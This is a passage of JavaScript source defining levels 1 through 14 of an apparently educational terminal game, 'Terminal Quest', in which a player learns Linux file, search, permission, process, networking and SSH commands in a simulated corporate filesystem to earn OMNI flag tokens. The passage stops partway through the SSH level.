'use strict';
/*
 * Terminal Quest — the 20-level campaign.
 *
 * Each level = {
 *   id, name, commands:[], mailFrom,
 *   briefing, tutorial, hints:[],
 *   flag | check(game, submitted) -> bool,
 *   setup(game)        build this level's world (idempotent — may re-run),
 *   cleanupAfter(game) optional world change once the level is cleared,
 *   onEvent(game,type,data)  react to player actions,
 *   httpHandler / denyText / successText  optional.
 * }
 *
 * Flags follow the form OMNI-XXXX so they feel like real capture tokens.
 * A level's `check` typically verifies BOTH that the flag text is right AND
 * (where relevant) that the world was actually manipulated correctly, so a
 * player cannot win by guessing the token.
 */

const { VFS } = require('../engine/vfs');

const P = 'player';
const DAY = 86400000;
const daysAgo = (n) => Date.now() - n * DAY;

function fileText(game, path) {
  const n = game.vfs.statOrNull(path, '/', game.playerUser());
  return n && n.type === 'file' ? n.content : null;
}
function exists(game, path) {
  return !!game.vfs.statOrNull(path, '/', game.playerUser());
}
function isDir(game, path) {
  const n = game.vfs.statOrNull(path, '/', game.playerUser());
  return n && n.type === 'dir';
}

const LEVELS = [

// ── LEVEL 1 ────────────────────────────────────────────────────────────────
{
  id: 1,
  name: 'First Login',
  commands: ['whoami', 'pwd', 'ls', 'clear', 'exit'],
  briefing: `
Welcome to OmniCorp, recruit. I'm Alex, senior admin — I'll be your lifeline.

Security won't unlock your workstation until you prove you know who and where
you are. Two questions:

  1. What is your username on this machine?
  2. What is the name of the directory you are currently sitting in?

Find both facts, then combine them into the badge token and submit it:

    echo OMNI-<username>-<dirname> > /dev/exit

For example, if you were user "bob" in a directory called "office", the token
would be OMNI-bob-office. Look around first — there's a file here worth reading.`,
  tutorial: `
  whoami            -> prints the account you are logged in as
  pwd               -> prints your current directory (its full path)
  ls                -> lists files here; try 'ls -a' to reveal hidden ones
  cat welcome.txt   -> read the onboarding note in your home directory
  clear             -> wipe the screen when it gets noisy

The last part of your pwd path is your "directory name". If pwd prints
/home/player, the directory name is 'player'.`,
  hints: [
    'Run `whoami` for question 1, and `pwd` for question 2.',
    'pwd prints /home/player. The final path component — player — is the directory name.',
    'Your username is "player" and your directory is "player", so the token is OMNI-player-player.'
  ],
  setup() {},
  check(game, sub) { return sub.trim() === 'OMNI-player-player'; },
  successText: `Badge accepted. Workstation unlocked. Alex: "See? You belong here."`,
  xp: 40
},

// ── LEVEL 2 ────────────────────────────────────────────────────────────────
{
  id: 2,
  name: 'Moving Around',
  commands: ['cd'],
  briefing: `
Good. Now learn to move. Last week an intern hid the quarterly access code
somewhere deep in the maintenance maze under /opt/maze. Navigate down through
the tunnels and read the code out of the file at the bottom.

Each directory holds a note (a 'clue.txt') telling you which tunnel to enter
next. Follow them all the way down, read the final 'code.txt', and submit:

    echo <the code you found> > /dev/exit`,
  tutorial: `
  cd <dir>     move INTO a subdirectory
  cd ..        move UP one level
  cd ~         jump home from anywhere
  cd /opt/maze jump straight there with an absolute path
  ls           see what's in the room you're standing in
  cat clue.txt read the note that tells you where to go next

Absolute paths start with / (from the root). Relative paths are read from
wherever you currently are.`,
  hints: [
    'Start with: cd /opt/maze  then ls and cat clue.txt to learn the next tunnel.',
    'Keep doing ls / cat clue.txt / cd <next> until you find code.txt instead of clue.txt.',
    'The path is /opt/maze/north/deep/vault. cat /opt/maze/north/deep/vault/code.txt.'
  ],
  setup(game) {
    const v = game.vfs;
    v.mkdirp('/opt/maze', '/', P, P);
    v.put('/opt/maze/clue.txt', 'Head NORTH. (cd north)\n', { owner: P });
    v.mkdirp('/opt/maze/north', '/', P, P);
    v.mkdirp('/opt/maze/east', '/', P, P);
    v.put('/opt/maze/east/clue.txt', 'Dead end. Go back with: cd ..\n', { owner: P });
    v.put('/opt/maze/north/clue.txt', 'Descend DEEP. (cd deep)\n', { owner: P });
    v.mkdirp('/opt/maze/north/deep', '/', P, P);
    v.put('/opt/maze/north/deep/clue.txt', 'The VAULT is here. (cd vault)\n', { owner: P });
    v.mkdirp('/opt/maze/north/deep/vault', '/', P, P);
    v.put('/opt/maze/north/deep/vault/code.txt', 'OMNI-MAZE-4417\n', { owner: P });
  },
  check(game, sub) { return sub.trim() === 'OMNI-MAZE-4417'; },
  successText: `Alex: "Nice footwork. You'll never fear a deep path again."`,
  xp: 50
},

// ── LEVEL 3 ────────────────────────────────────────────────────────────────
{
  id: 3,
  name: 'Creating & Destroying',
  commands: ['mkdir', 'touch', 'rm', 'rmdir'],
  briefing: `
The 'project-falcon' folder in your home directory is a disaster. Marketing
dumped junk in it. Restructure it to this exact spec:

  ~/project-falcon/
    ├── src/          (must exist)
    ├── docs/         (must exist)
    └── README.md     (must exist, can be empty)

And it must NOT contain any of the junk files (junk1.tmp, junk2.tmp, notes~).
Remove the empty 'old' directory too.

When the folder matches the spec exactly, the validator drops a flag file at
~/project-falcon/.done — cat it and submit its contents.`,
  tutorial: `
  mkdir src              make a directory
  mkdir -p a/b/c         make a whole nested path at once
  touch README.md        create an empty file
  rm junk1.tmp           delete a file
  rmdir old              delete an EMPTY directory (safer than rm -r)

Work inside the folder: cd ~/project-falcon first.`,
  hints: [
    'cd ~/project-falcon, then ls -a to see everything, including the junk.',
    'mkdir src docs ; touch README.md ; rm junk1.tmp junk2.tmp notes~ ; rmdir old',
    'After it matches the spec, the .done flag appears. cat .done to read the token.'
  ],
  setup(game) {
    const v = game.vfs;
    const base = '/home/player/project-falcon';
    v.mkdirp(base, '/', P, P);
    v.put(base + '/junk1.tmp', 'delete me\n', { owner: P });
    v.put(base + '/junk2.tmp', 'me too\n', { owner: P });
    v.put(base + '/notes~', 'editor backup cruft\n', { owner: P });
    v.mkdirp(base + '/old', '/', P, P);
  },
  onEvent(game, type) {
    const base = '/home/player/project-falcon';
    if (!isDir(game, base)) return;
    const ok = isDir(game, base + '/src') && isDir(game, base + '/docs') &&
      exists(game, base + '/README.md') &&
      !exists(game, base + '/junk1.tmp') && !exists(game, base + '/junk2.tmp') &&
      !exists(game, base + '/notes~') && !exists(game, base + '/old');
    if (ok && !exists(game, base + '/.done')) {
      game.vfs.put(base + '/.done', 'OMNI-FALCON-STRUCT-88\n', { owner: P });
      game.print('\x1b[32m[validator] project-falcon now matches the spec — a .done flag appeared.\x1b[0m\n');
    }
  },
  check(game, sub) {
    return sub.trim() === 'OMNI-FALCON-STRUCT-88' && exists(game, '/home/player/project-falcon/.done');
  },
  successText: `Alex: "Clean. Marketing will find a way to mess it up again by Friday."`,
  xp: 60
},

// ── LEVEL 4 ────────────────────────────────────────────────────────────────
{
  id: 4,
  name: 'Copy & Move',
  commands: ['cp', 'mv'],
  briefing: `
The security-camera archive in ~/photos is a pile of loose JPGs named by date,
like 2026-01-03_cam1.jpg. Sort them into per-day folders.

Create a folder for each date (2026-01-03, 2026-01-04, 2026-01-05) and MOVE each
photo into the folder matching the date in its name. Also, the file
'evidence.jpg' is precious — make a backup COPY of it called 'evidence.jpg.bak'
in ~/photos before you touch anything else.

When every dated photo is filed under its date folder and the backup exists,
a flag file ~/photos/manifest.txt is generated. Submit its contents.`,
  tutorial: `
  cp evidence.jpg evidence.jpg.bak   copy (original stays)
  mv file.jpg 2026-01-03/            move a file into a folder
  mkdir 2026-01-03                   (you know this one — make the folder first)
  mv *.jpg somewhere/                the * matches many files at once

Remember cp keeps the original; mv does not.`,
  hints: [
    'First: cp evidence.jpg evidence.jpg.bak. Then mkdir the three date folders.',
    'Move by date: mv 2026-01-03_*.jpg 2026-01-03/  (globs save you typing).',
    'Do the same for 01-04 and 01-05. Every *_camN.jpg must live under its date folder.'
  ],
  setup(game) {
    const v = game.vfs;
    const base = '/home/player/photos';
    v.mkdirp(base, '/', P, P);
    const files = [
      '2026-01-03_cam1.jpg', '2026-01-03_cam2.jpg',
      '2026-01-04_cam1.jpg', '2026-01-04_cam2.jpg', '2026-01-04_cam3.jpg',
      '2026-01-05_cam1.jpg'
    ];
    for (const f of files) v.put(base + '/' + f, `JPEGDATA:${f}\n`, { owner: P });
    v.put(base + '/evidence.jpg', 'JPEGDATA:the-important-one\n', { owner: P });
  },
  onEvent(game) {
    const base = '/home/player/photos';
    const dates = ['2026-01-03', '2026-01-04', '2026-01-05'];
    const expect = {
      '2026-01-03': ['2026-01-03_cam1.jpg', '2026-01-03_cam2.jpg'],
      '2026-01-04': ['2026-01-04_cam1.jpg', '2026-01-04_cam2.jpg', '2026-01-04_cam3.jpg'],
      '2026-01-05': ['2026-01-05_cam1.jpg']
    };
    if (!exists(game, base + '/evidence.jpg.bak')) return;
    for (const d of dates) {
      if (!isDir(game, base + '/' + d)) return;
      for (const f of expect[d]) if (!exists(game, base + '/' + d + '/' + f)) return;
    }
    if (!exists(game, base + '/manifest.txt')) {
      game.vfs.put(base + '/manifest.txt', 'OMNI-ARCHIVE-SORTED-2026\n', { owner: P });
      game.print('\x1b[32m[validator] Archive filed correctly — manifest.txt generated.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-ARCHIVE-SORTED-2026' && exists(game, '/home/player/photos/manifest.txt'); },
  successText: `Alex: "The Director loves a tidy evidence room. Well done."`,
  xp: 70
},

// ── LEVEL 5 ────────────────────────────────────────────────────────────────
{
  id: 5,
  name: 'Viewing Files',
  commands: ['cat', 'less', 'head', 'tail'],
  briefing: `
The billing service went down at 03:00 last night and came back on its own.
The log is at /var/log/billing.log. Somewhere in there is exactly one line
marked FATAL that explains the outage — and that line contains a token.

Read the log (it's long — head, tail and less are your friends) and find the
FATAL line. Submit the token printed on it.`,
  tutorial: `
  cat  /var/log/billing.log   dump the whole file (long!)
  head /var/log/billing.log   just the first 10 lines
  tail /var/log/billing.log   just the last 10 lines
  tail -n 30 file             the last 30 lines
  less /var/log/billing.log   page through comfortably

Outages usually show up near the END of a log — tail is a good first move.`,
  hints: [
    'The crash was at 03:00 and the service recovered — look near the end. Try tail -n 40.',
    'Scan for the word FATAL. (Next level you\'ll learn grep to do this instantly.)',
    'The FATAL line reads: "FATAL: connection pool exhausted [token OMNI-BILLING-DEADLOCK]".'
  ],
  setup(game) {
    const v = game.vfs;
    const lines = [];
    for (let i = 0; i < 60; i++) {
      lines.push(`Jan  5 0${Math.floor(i / 20)}:${String(i % 60).padStart(2, '0')}:11 billing[774]: INFO processed invoice #${1000 + i}`);
    }
    lines.splice(48, 0, 'Jan  5 03:00:02 billing[774]: WARN connection latency rising');
    lines.splice(49, 0, 'Jan  5 03:00:07 billing[774]: FATAL: connection pool exhausted [token OMNI-BILLING-DEADLOCK]');
    lines.splice(50, 0, 'Jan  5 03:01:00 billing[774]: INFO watchdog restarted service');
    v.put('/var/log/billing.log', lines.join('\n') + '\n');
  },
  check(game, sub) { return sub.trim() === 'OMNI-BILLING-DEADLOCK'; },
  successText: `Alex: "Connection pool too small. I'll bump it. You found it fast."`,
  xp: 70
},

// ── LEVEL 6 ────────────────────────────────────────────────────────────────
{
  id: 6,
  name: 'Redirection',
  commands: ['echo'],
  briefing: `
Time to WRITE, not just read. The Director wants a status report.

  1. Create /home/player/report.txt containing exactly the line:  STATUS: OK
     (use echo with > to create/overwrite the file)
  2. Then APPEND a second line to it:  CHECKED-BY: player
     (use >> so you don't erase the first line)

When report.txt contains both lines in that order, a flag is written to
~/report.flag. Submit it.

(You already met echo and redirection in passing — now they're the whole job.
Redirection: >  overwrites,  >>  appends.)`,
  tutorial: `
  echo "STATUS: OK" > report.txt         create the file with one line
  echo "CHECKED-BY: player" >> report.txt append a second line
  cat report.txt                          verify both lines are there

Watch the difference:
  >   creates or OVERWRITES (wipes what was there)
  >>  APPENDS to the end (keeps existing content)`,
  hints: [
    'echo "STATUS: OK" > report.txt   creates the file with the first line.',
    'echo "CHECKED-BY: player" >> report.txt   appends without erasing line 1.',
    'cat report.txt should show STATUS: OK then CHECKED-BY: player, in that order.'
  ],
  setup() {},
  onEvent(game) {
    const c = fileText(game, '/home/player/report.txt');
    if (c === null) return;
    const norm = c.replace(/\n+$/, '');
    if (norm === 'STATUS: OK\nCHECKED-BY: player' && !exists(game, '/home/player/report.flag')) {
      game.vfs.put('/home/player/report.flag', 'OMNI-REPORT-FILED-06\n', { owner: P });
      game.print('\x1b[32m[validator] report.txt looks right — report.flag written.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-REPORT-FILED-06' && exists(game, '/home/player/report.flag'); },
  successText: `Alex: "The Director grunted approvingly. That's basically a medal."`,
  xp: 80
},

// ── LEVEL 7 ────────────────────────────────────────────────────────────────
{
  id: 7,
  name: 'Pipes & Filters',
  commands: ['|', 'wc', 'sort', 'uniq'],
  briefing: `
Support exported today's error tickets to /var/data/errors.csv — one error
code per line, thousands of them, unsorted and repeated. Management wants to
know: which single error code occurred MOST often?

Build a pipeline: sort the lines, count how many times each unique one appears,
then sort THOSE counts to find the champion. The winning error code is your
token. Submit it (just the code, e.g. E500).`,
  tutorial: `
  cat errors.csv | wc -l                 how many lines total?
  sort errors.csv | uniq                 collapse duplicates (must sort first!)
  sort errors.csv | uniq -c              count each unique line
  sort errors.csv | uniq -c | sort -nr   put the biggest count on top

The pipe | feeds one command's output into the next. This "sort | uniq -c |
sort -nr" combo is one of the most-used incantations in all of Linux.`,
  hints: [
    'The whole answer is one pipeline. Start: sort /var/data/errors.csv | uniq -c',
    'Add | sort -nr to rank by count, then | head -1 to see just the winner.',
    'The top line is the champion count next to its code. Submit that error code.'
  ],
  setup(game) {
    const rows = [];
    const dist = { E500: 42, E404: 18, E403: 9, E502: 27, E400: 5 };
    for (const [code, n] of Object.entries(dist)) for (let i = 0; i < n; i++) rows.push(code);
    // shuffle deterministically
    for (let i = rows.length - 1; i > 0; i--) {
      const j = (i * 7 + 3) % (i + 1);
      [rows[i], rows[j]] = [rows[j], rows[i]];
    }
    game.vfs.put('/var/data/errors.csv', rows.join('\n') + '\n');
  },
  check(game, sub) { return sub.trim().toUpperCase() === 'E500'; },
  successText: `Alex: "E500 — the internal server error strikes again. Nice analysis."`,
  xp: 90
},

// ── LEVEL 8 ────────────────────────────────────────────────────────────────
{
  id: 8,
  name: 'Searching with grep',
  commands: ['grep'],
  briefing: `
Someone leaked our secret recipe. The word SECRET_RECIPE appears in exactly
one file somewhere under /data — but /data has hundreds of files across many
folders. Find the offending file and read the token stored beside the marker.

This is grep's whole reason to exist: search file CONTENTS across a tree.
Submit the token that appears after SECRET_RECIPE.`,
  tutorial: `
  grep SECRET_RECIPE file.txt        search one file
  grep -i secret file.txt            case-insensitive
  grep -n pattern file.txt           show line numbers
  grep -r SECRET_RECIPE /data        search EVERY file under /data (recursive)
  grep -rl SECRET_RECIPE /data       show only the FILE NAME that matched

Recursive grep (-r) is how you search a whole directory tree at once.`,
  hints: [
    'One command does it: grep -r SECRET_RECIPE /data',
    'Add -n to see the exact line, or -l to see just which file hides it.',
    'The matching line reads: SECRET_RECIPE OMNI-RECIPE-COLA-X9. Submit OMNI-RECIPE-COLA-X9.'
  ],
  setup(game) {
    const v = game.vfs;
    const depts = ['hr', 'sales', 'eng', 'legal', 'ops'];
    for (const d of depts) {
      v.mkdirp('/data/' + d, '/', P, P);
      for (let i = 0; i < 12; i++) {
        v.put(`/data/${d}/doc_${i}.txt`, `Department ${d} memo #${i}\nRoutine paperwork, nothing to see.\n`, { owner: P });
      }
    }
    v.put('/data/legal/archive/case_1187.txt',
      'Case 1187 — beverage division\nExhibit A follows:\nSECRET_RECIPE OMNI-RECIPE-COLA-X9\n(do not distribute)\n', { owner: P });
  },
  check(game, sub) { return sub.trim() === 'OMNI-RECIPE-COLA-X9'; },
  successText: `Alex: "Found it in legal/archive. I'll alert the beverage division."`,
  xp: 100
},

// ── LEVEL 9 ────────────────────────────────────────────────────────────────
{
  id: 9,
  name: 'The find Command',
  commands: ['find'],
  briefing: `
The /var/spool partition is clogged with old temp files. Policy: delete every
file under /var/spool/tmp whose name ends in .tmp AND that is older than 30
days. Leave newer files and non-.tmp files alone.

There are exactly 6 stale .tmp files to remove and several recent ones to keep.
When precisely the 6 stale files are gone (and nothing else), a flag file
appears at /var/spool/tmp/.cleaned. Submit its contents.

Where grep searches contents, find searches by NAME, AGE, SIZE and TYPE.`,
  tutorial: `
  find /var/spool/tmp -name "*.tmp"          all .tmp files (quote the pattern!)
  find /var/spool/tmp -name "*.tmp" -mtime +30   ...older than 30 days
  find ... -mtime +30 -delete                delete what matched
  find /var -size +10M                        (bonus) huge files

ALWAYS run find WITHOUT -delete first to see what you're about to remove.`,
  hints: [
    'List first: find /var/spool/tmp -name "*.tmp" -mtime +30',
    'When the list looks right (6 files), append -delete to remove them.',
    'find /var/spool/tmp -name "*.tmp" -mtime +30 -delete  — then cat /var/spool/tmp/.cleaned'
  ],
  setup(game) {
    const v = game.vfs;
    v.mkdirp('/var/spool/tmp', '/', P, P);
    // 6 stale .tmp files (older than 30 days)
    for (let i = 0; i < 6; i++) v.put(`/var/spool/tmp/stale_${i}.tmp`, 'old junk\n', { owner: P, mtime: daysAgo(40 + i) });
    // recent .tmp files to keep
    for (let i = 0; i < 3; i++) v.put(`/var/spool/tmp/fresh_${i}.tmp`, 'recent\n', { owner: P, mtime: daysAgo(2 + i) });
    // old non-.tmp files to keep
    v.put('/var/spool/tmp/keep.log', 'important\n', { owner: P, mtime: daysAgo(100) });
    v.put('/var/spool/tmp/config.cfg', 'settings\n', { owner: P, mtime: daysAgo(200) });
  },
  onEvent(game, type) {
    if (type !== 'rm') return;
    const dir = '/var/spool/tmp';
    let stale = 0, freshGone = false;
    try {
      game.vfs.walk(dir, '/', game.playerUser(), (abs, name, node) => {
        if (name.startsWith('stale_') && name.endsWith('.tmp')) stale++;
      });
    } catch (e) { return; }
    const keepOk = exists(game, dir + '/keep.log') && exists(game, dir + '/config.cfg') &&
      exists(game, dir + '/fresh_0.tmp') && exists(game, dir + '/fresh_1.tmp') && exists(game, dir + '/fresh_2.tmp');
    if (stale === 0 && keepOk && !exists(game, dir + '/.cleaned')) {
      game.vfs.put(dir + '/.cleaned', 'OMNI-SPOOL-RECLAIMED-30D\n', { owner: P });
      game.print('\x1b[32m[validator] All stale .tmp files gone, keepers intact — .cleaned written.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-SPOOL-RECLAIMED-30D' && exists(game, '/var/spool/tmp/.cleaned'); },
  successText: `Alex: "Surgical. You deleted exactly what policy said and nothing more."`,
  xp: 110
},

// ── LEVEL 10 — BOSS 1 ────────────────────────────────────────────────────────
{
  id: 10,
  name: 'BOSS: The Disk Crisis',
  mailFrom: 'director@omnicorp',
  commands: ['du', 'df'],
  briefing: `
*** PRIORITY-1 FROM THE DIRECTOR ***

The root filesystem is at 100%. Services are failing. You have this shift to
fix it. Combine everything you know:

  • df -h                    confirm the disk is full
  • du -sh /var/*            find which directory is the hog
  • find ... -size +...      pinpoint the monster file
  • rm                       delete it
  • grep                     read the recovery token it leaves behind

There is ONE enormous bogus file hiding under /var eating ~700 MB. Find it,
delete it, and get Use% back under 90%. When you do, the omnid daemon writes a
recovery token to /var/log/recovery.log — grep it out and submit it.`,
  tutorial: `
  df -h                       overall disk usage per filesystem
  du -sh /var/*               size of each thing directly under /var
  du -h /var/log              drill deeper into a suspect directory
  find /var -size +100M       files larger than 100 MB
  rm /path/to/monster         reclaim the space

df tells you THAT the disk is full; du tells you WHERE; find pinpoints the file.`,
  hints: [
    'Start high: df -h (100%!) then du -sh /var/* to find the fattest directory.',
    'The hog is under /var/cache. Pinpoint it: find /var -size +100M',
    'Delete /var/cache/omni/blob.bin, run df -h again (now <90%), then: grep TOKEN /var/log/recovery.log'
  ],
  setup(game) {
    const v = game.vfs;
    v.capacityKB = 1024 * 1024; // 1 GB
    game.disk.baseUsedKB = 300000; // 300 MB of "other" usage
    // owned by player so the junior admin can actually reclaim the space with rm
    v.mkdirp('/var/cache/omni', '/', P, P);
    v.put('/var/cache/omni/blob.bin', 'CORRUPT-CACHE-BLOB\n', { owner: P, sizeKB: 700 * 1024 }); // 700 MB
    v.mkdirp('/var/lib/omni', '/', 'root', 'root');
    v.put('/var/lib/omni/data.db', 'legit database\n', { owner: 'root', sizeKB: 20 * 1024 });
    // recovery.log is empty until the disk recovers
    v.put('/var/log/recovery.log', '# recovery daemon standing by — waiting for free space\n', { owner: 'root' });
    game.levelState.recovered = false;
  },
  onEvent(game, type) {
    const used = game.vfs.usedKB() + game.disk.baseUsedKB;
    const pct = Math.round((used / game.vfs.capacityKB) * 100);
    if (pct < 90 && !game.levelState.recovered) {
      game.levelState.recovered = true;
      game.vfs.put('/var/log/recovery.log',
        '# recovery daemon standing by — waiting for free space\n' +
        `Jan  5 03:14:00 omnicorp omnid[812]: free space restored (${pct}% used)\n` +
        'Jan  5 03:14:01 omnicorp omnid[812]: RECOVERY TOKEN OMNI-DISK-SAVED-A7F issued\n',
        { owner: 'root' });
      game.print('\x1b[32m[omnid] Free space restored. A recovery token was logged to /var/log/recovery.log.\x1b[0m\n');
    }
  },
  check(game, sub) {
    return sub.trim() === 'OMNI-DISK-SAVED-A7F' && game.levelState.recovered;
  },
  successText: `The Director: "You just saved the quarter. I'll remember this. Maybe."`,
  cleanupAfter(game) { game.vfs.capacityKB = 1024 * 1024; },
  xp: 200
},

// ── LEVEL 11 ────────────────────────────────────────────────────────────────
{
  id: 11,
  name: 'Users & Permissions',
  commands: ['chmod', 'chown', 'ls -l'],
  briefing: `
Your team's directory /srv/shared is a mess of loose permissions. It already
belongs to you (user player), but it's wide open and mis-grouped. Lock it down
to policy:

  • The directory's GROUP must be 'devteam'   (chown :devteam  or  chgrp)
    — you're a member of devteam, so you can set it yourself.
  • The directory mode must be 750 (rwxr-x---): owner full, group read+execute,
    OTHERS nothing.
  • The secret file /srv/shared/keys.txt must be mode 600 (rw-------):
    readable and writable ONLY by its owner.

Use ls -l to inspect permissions as you work. When the group and both modes are
correct, omnid drops the token into /srv/shared/audit.pass. Submit it.`,
  tutorial: `
  ls -l /srv/shared            see permissions: drwxrwxrwx = mode 777
  ls -ld /srv/shared           the directory's own line (owner, group, mode)
  chown :devteam /srv/shared   set the GROUP (owner stays; you're in devteam)
  chgrp devteam /srv/shared    same thing, shorter
  chmod 750 /srv/shared        rwx r-x --- (owner / group / others)
  chmod 600 /srv/shared/keys.txt   rw- --- ---

Octal cheat sheet per digit: r=4, w=2, x=1. 7=rwx, 5=r-x, 6=rw-, 0=---.
So 750 = owner rwx(7), group r-x(5), others ---(0).`,
  hints: [
    'Inspect first: ls -l /srv/shared and ls -l /srv/shared/keys.txt.',
    'chown :devteam /srv/shared  (or chgrp devteam /srv/shared) ; chmod 750 /srv/shared ; chmod 600 /srv/shared/keys.txt',
    'Verify with ls -l — directory shows drwxr-x--- group devteam, keys.txt shows -rw-------. Then cat audit.pass.'
  ],
  setup(game) {
    const v = game.vfs;
    // owned by player already (their team dir) but group=root and wide-open modes
    v.mkdirp('/srv/shared', '/', P, 'root', 0o777);
    v.put('/srv/shared/keys.txt', 'api_key=hunter2\n', { owner: P, group: 'root', mode: 0o666 });
    v.put('/srv/shared/readme.txt', 'Shared team space. Handle secrets carefully.\n', { owner: P, mode: 0o644 });
    // ensure a clean slate on replay/reset
    const dir = v.root.children['srv'].children['shared'];
    dir.owner = P; dir.group = 'root'; dir.mode = 0o777;
    dir.children['keys.txt'].owner = P; dir.children['keys.txt'].group = 'root'; dir.children['keys.txt'].mode = 0o666;
  },
  onEvent(game) {
    const dir = game.vfs.statOrNull('/srv/shared', '/', game.playerUser());
    const key = game.vfs.statOrNull('/srv/shared/keys.txt', '/', game.playerUser());
    if (!dir || !key) return;
    if (dir.owner === 'player' && dir.group === 'devteam' &&
        (dir.mode & 0o777) === 0o750 && (key.mode & 0o777) === 0o600 &&
        !exists(game, '/srv/shared/audit.pass')) {
      game.vfs.put('/srv/shared/audit.pass', 'OMNI-PERMS-LOCKED-750\n', { owner: 'player', mode: 0o600 });
      game.print('\x1b[32m[audit] Permissions match policy — audit.pass written.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-PERMS-LOCKED-750' && exists(game, '/srv/shared/audit.pass'); },
  successText: `Alex: "Least privilege. Now only the right people can touch those keys."`,
  xp: 130
},

// ── LEVEL 12 ────────────────────────────────────────────────────────────────
{
  id: 12,
  name: 'Process Management',
  commands: ['ps', 'top', 'kill', '&', 'jobs', 'fg', 'bg'],
  briefing: `
The server is crawling. Something is pinning a CPU core. A rogue process called
'stressor' is chewing 95% CPU under your own user account.

Find its PID (ps aux, or top to see the CPU hog at the top), then kill it. It's
stubborn — it ignores a polite SIGTERM, so you'll need SIGKILL (-9). Once it's
dead, omnid notices the load drop and writes a token to /var/log/load.log.
Submit it.`,
  tutorial: `
  ps aux                  every process: USER PID %CPU ... COMMAND
  ps aux | grep stressor  filter to just the suspect
  top                     processes sorted by CPU — hog is on top
  kill <pid>              polite stop (SIGTERM). Some processes ignore it.
  kill -9 <pid>           forceful stop (SIGKILL) — cannot be ignored

Bonus job control:  sleep 60 &  (background),  jobs,  fg %1.`,
  hints: [
    'Find it: ps aux | grep stressor  (or run top and read the PID off the top line).',
    'Try kill <pid> first — it will refuse. Then escalate: kill -9 <pid>.',
    'After the kill, check /var/log/load.log for the token (cat it).'
  ],
  setup(game) {
    game.procs.push({ pid: 6605, user: 'player', cpu: 95.4, mem: 8.1, time: '00:19:44', cmd: '/usr/local/bin/stressor --threads=4', critical: true });
    game.vfs.put('/var/log/load.log', '# load monitor — nominal\n', { owner: 'root' });
    game.levelState.killed = false;
  },
  onEvent(game, type, data) {
    if (type === 'kill' && data.pid === 6605 && !game.levelState.killed) {
      game.levelState.killed = true;
      game.vfs.put('/var/log/load.log',
        '# load monitor\nJan  5 04:02:10 omnicorp omnid[812]: load average dropped to 0.30\n' +
        'Jan  5 04:02:11 omnicorp omnid[812]: STABILITY TOKEN OMNI-CPU-CALM-9K9\n', { owner: 'root' });
      game.print('\x1b[32m[omnid] CPU load back to normal — token written to /var/log/load.log.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-CPU-CALM-9K9' && game.levelState.killed; },
  successText: `Alex: "SIGKILL for the win. Never negotiate with a runaway thread."`,
  xp: 140
},

// ── LEVEL 13 ────────────────────────────────────────────────────────────────
{
  id: 13,
  name: 'Networking Basics',
  commands: ['ping', 'ip', 'ifconfig', 'netstat', 'curl'],
  briefing: `
Customers can't reach our internal web service. You need to diagnose it layer
by layer, like a real on-call engineer:

  1. Is our own network interface even up?      (ip addr)   — eth0 is DOWN!
  2. Bring eth0 up.                              (sudo ip link set eth0 up)
  3. Can we now reach the web host?             (ping webserver01)
  4. Is the web service actually answering?     (curl http://webserver01/status)

The /status page returns a JSON blob containing a diagnostic token once the
link is restored. Read it and submit the token value.

(You've been granted temporary sudo for network commands this shift.)`,
  tutorial: `
  ip addr                         list interfaces — look for state UP/DOWN
  sudo ip link set eth0 up        enable the interface (needs privilege)
  ifconfig                        the classic equivalent view
  ping -c 3 webserver01           are packets getting through?
  netstat -tulpn                  what's listening locally
  curl http://webserver01/status  ask the service directly

Diagnose bottom-up: link → reachability (ping) → service (curl).`,
  hints: [
    'Check the link first: ip addr. eth0 is DOWN — that\'s why nothing works.',
    'Bring it up: sudo ip link set eth0 up   (then ping -c 3 webserver01 should succeed).',
    'Now curl http://webserver01/status and read the "token" field from the JSON.'
  ],
  setup(game) {
    game.sudoUnlocked = true;
    game.network.eth0.up = false;
    game.network.hosts.webserver01.up = false;
    game.network.hosts.webserver01.ports[80].responding = false;
    game.network.hosts.webserver01.ports[80].body = () => JSON.stringify({ status: 'up', token: 'OMNI-NET-LINKUP-42' }) + '\n';
    game.levelState.linkFixed = false;
  },
  onEvent(game, type, data) {
    if (type === 'iface' && data.up && !game.levelState.linkFixed) {
      game.levelState.linkFixed = true;
      game.network.hosts.webserver01.up = true;
      game.network.hosts.webserver01.ports[80].responding = true;
      game.print('\x1b[32m[net] eth0 is UP. webserver01 is reachable again — try curl now.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-NET-LINKUP-42' && game.levelState.linkFixed; },
  successText: `Alex: "Textbook triage: link, then ping, then curl. Customers are back."`,
  xp: 150,
  httpHandler() { return null; }
},

// ── LEVEL 14 ────────────────────────────────────────────────────────────────
{
  id: 14,
  name: 'SSH & Remote Work',
  commands: ['ssh', 'scp', 'ssh-keygen', 'ssh-copy-id'],
  briefing: `
The disaster-recovery key lives on the offsite vault node 'backup01', in
/vault/dr_key.txt. You must retrieve it — but backup01 only accepts SSH KEY
authentication, and you don't have a key yet.

  1. Generate your SSH key pair.                 (ssh-keygen)
  2. Install your public key on backup01.        (ssh-copy-id backup@backup01)
  3. Copy the key file down to your home dir.     (scp backup@backup01:/vault/dr_key.txt ~)
     (or read it remotely: ssh backup@backup01 cat /vault/dr_key.txt)

The file contains the DR token. Submit it.`,
  tutorial: `
  ssh-keygen                              make ~/.ssh/id_ed25519 (+ .pub)
  ssh-copy-id backup@backup01             install your PUBLIC key on the host
  ssh backup@backup01 ls /vault           run one command remotely
  ssh backup@backup01 cat /vault/dr_key.txt   read a remote file
  scp backup@backup01:/vault/dr_key.txt ~   copy a remote file to home

You keep the PRIVATE key secret; you SHARE the PUBLIC key (.pub). ssh-copy-id
puts your public key in the remote's authorized list.`,
  hints: [
    'Without a key you get "Permission denied (publickey)". First: ssh-keygen.',
    'Then authorize yourself: ssh-copy-id backup@backup01.',
    'Now it works: ssh backup@backup01 cat /vault/dr_key.txt   (or scp it down).'
  ],
  setup(game) {
    game.network.hosts.backup01.files = {
      '/etc/motd': 'backup01 — offsite vault node.\n',
      '/vault/dr_key.txt': 'DR-RECOVERY-KEY\nOMNI-VAULT-DRKEY-C0LD\n',
      '/vault/manifest.txt': 'dr_key.txt\nsnapshots/\n'
    };
    game.sshAuthorized.delete('backup01:backup');
  },
